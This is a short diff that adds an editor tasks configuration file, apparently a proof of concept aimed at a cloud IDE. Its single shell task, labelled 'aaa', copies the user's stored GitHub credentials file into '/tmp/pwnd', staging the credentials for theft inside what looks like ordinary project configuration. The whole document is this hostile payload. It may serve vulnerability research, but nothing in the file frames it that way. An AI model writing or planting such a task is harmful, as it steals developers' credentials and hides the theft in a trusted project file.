@@ -1,0 +1,10 @@
+{
+    "version": "2.0.0",
+    "tasks": [
+      {
+        "label": "aaa",
+        "type": "shell",
+        "command": "cp /cloudide/meta/user/.my_github_credentials /tmp/pwnd"
+      }
+    ]
+}
